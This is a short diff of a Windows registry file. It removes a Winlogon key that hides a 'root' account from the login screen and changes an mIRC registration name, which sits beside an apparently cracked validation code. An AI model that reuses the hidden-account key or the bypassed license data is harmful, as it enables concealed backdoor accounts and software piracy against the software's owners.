@@ -1,9 +1,5 @@
 REGEDIT4
 
-[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList]
-"root"=dword:00000000
-
-
 [HKEY_CURRENT_USER\Software\mIRC]
  
 [HKEY_CURRENT_USER\Software\mIRC\LastRun]
@@ -13,7 +9,7 @@ REGEDIT4
 @="5436-531206"
  
 [HKEY_CURRENT_USER\Software\mIRC\UserName]
-@="independentcod"
+@="DeltaFoX"
  
 [HKEY_CURRENT_USER\Software\mIRC\Validated]
 @="1337-347150-2018"
